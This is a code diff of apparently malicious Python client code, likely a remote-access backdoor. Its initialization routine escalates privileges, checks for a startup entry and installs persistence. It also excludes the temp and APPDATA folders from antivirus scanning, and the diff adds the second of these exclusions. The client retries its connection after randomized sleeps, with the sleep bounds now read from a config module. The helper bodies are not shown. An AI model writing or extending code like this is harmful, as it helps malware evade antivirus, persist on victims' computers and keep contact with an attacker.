@@ -8,14 +8,18 @@ import os
 import sys
 import time
 import random
+import core.conf as conf
 
 
 def __initialization__():
     elevate_script()
     test_for_startup_app()
     time.sleep(generate_random_int())
-    exclude_path_antivirus(tempfile.gettempdir())
-    __persistant()
+    if not sys.executable == conf.APPDATA_EXE:
+        exclude_path_antivirus(tempfile.gettempdir())
+        generate_random_int()
+        exclude_path_antivirus(os.getenv('APPDATA'))
+        __persistant()
 
 
 
@@ -35,7 +39,7 @@ if __name__ == "__main__":
             sys.exit(0)
         except Exception as err:
             display_msg("Unable to establish connection " + str(err), "r")
-            dur = random.randint(100, 150)
-            display_msg("Going to sleep for "+ str(dur))
+            dur = random.randint(conf.__start_time, conf.__end_time)
+            display_msg("Going to sleep for "+ str(dur) + " seconds")
             time.sleep(dur)
 
